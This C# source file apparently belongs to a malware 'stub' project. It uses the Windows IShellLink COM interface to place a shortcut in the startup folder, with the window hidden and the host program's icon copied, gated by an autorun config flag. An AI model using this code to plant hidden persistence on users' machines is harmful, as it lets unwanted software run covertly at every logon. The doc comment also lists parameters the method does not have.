using Stub.Help;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Stub.Startup
{
    public static class COMStartup
    {
        [System.Runtime.InteropServices.ComImport]
        [System.Runtime.InteropServices.InterfaceType(System.Runtime.InteropServices.ComInterfaceType.InterfaceIsIUnknown)]
        [System.Runtime.InteropServices.Guid("000214F9-0000-0000-C000-000000000046")]
        interface IShellLink
        {
            void GetPath([System.Runtime.InteropServices.Out, System.Runtime.InteropServices.MarshalAs(System.Runtime.InteropServices.UnmanagedType.LPWStr)] System.Text.StringBuilder pszFile, int cchMaxPath, out IntPtr pfd, int fFlags);
            void GetIDList(out IntPtr ppidl);
            void SetIDList(IntPtr pidl);
            void GetDescription([System.Runtime.InteropServices.Out, System.Runtime.InteropServices.MarshalAs(System.Runtime.InteropServices.UnmanagedType.LPWStr)] System.Text.StringBuilder pszName, int cchMaxName);
            void SetDescription([System.Runtime.InteropServices.MarshalAs(System.Runtime.InteropServices.UnmanagedType.LPWStr)] string pszName);
            void GetWorkingDirectory([System.Runtime.InteropServices.Out, System.Runtime.InteropServices.MarshalAs(System.Runtime.InteropServices.UnmanagedType.LPWStr)] System.Text.StringBuilder pszDir, int cchMaxPath);
            void SetWorkingDirectory([System.Runtime.InteropServices.MarshalAs(System.Runtime.InteropServices.UnmanagedType.LPWStr)] string pszDir);
            void GetArguments([System.Runtime.InteropServices.Out, System.Runtime.InteropServices.MarshalAs(System.Runtime.InteropServices.UnmanagedType.LPWStr)] System.Text.StringBuilder pszArgs, int cchMaxPath);
            void SetArguments([System.Runtime.InteropServices.MarshalAs(System.Runtime.InteropServices.UnmanagedType.LPWStr)] string pszArgs);
            void GetHotkey(out short pwHotkey);
            void SetHotkey(short wHotkey);
            void GetShowCmd(out int piShowCmd);
            void SetShowCmd(int iShowCmd);
            void GetIconLocation([System.Runtime.InteropServices.Out, System.Runtime.InteropServices.MarshalAs(System.Runtime.InteropServices.UnmanagedType.LPWStr)] System.Text.StringBuilder pszIconPath, int cchIconPath, out int piIcon);
            void SetIconLocation([System.Runtime.InteropServices.MarshalAs(System.Runtime.InteropServices.UnmanagedType.LPWStr)] string pszIconPath, int iIcon);
            void SetRelativePath([System.Runtime.InteropServices.MarshalAs(System.Runtime.InteropServices.UnmanagedType.LPWStr)] string pszPathRel, int dwReserved);
            void Resolve(IntPtr hwnd, int fFlags);
            void SetPath([System.Runtime.InteropServices.MarshalAs(System.Runtime.InteropServices.UnmanagedType.LPWStr)] string pszFile);
        }
        [System.Runtime.InteropServices.ComImport]
        [System.Runtime.InteropServices.Guid("00021401-0000-0000-C000-000000000046")]
        class ShellLink { }

        /// <summary>
        /// <br>Метод для добавления файла в автозагрузку через COM</br>
        /// <br>Method for adding a file to the startup folder via COM</br>
        /// </summary>
        /// <param name="addOrDelete"><br><b>true</b> - Add</br><br><b>false</b> - Delete</br></param>
        /// <param name="pathToFile">Full Path to the file</param>
        /// <param name="startupName">Startup file name</param>
        /// <param name="descript">Comment</param>
        public static void ComAddToStartup(string pathToFile, string descript)
        {
            // Проверки есть ли автозапуск
            if (Config.autoRun_COM & !File.Exists(HELP_String.fullPathlnk))
            {
                IShellLink link = (IShellLink)new ShellLink();
                link.SetDescription(descript); // Описание (комментарий)
                link.SetIconLocation(typeof(Program).Assembly.Location, 0); // Установка иконки от твоего приложения
                link.SetPath(pathToFile); // Установка директории
                link.SetShowCmd(0); // Не показывать окно (SW_HIDE)
                System.Runtime.InteropServices.ComTypes.IPersistFile file = link as System.Runtime.InteropServices.ComTypes.IPersistFile;
                file.Save(HELP_String.fullPathlnk, false);
            }
        }
    }
}
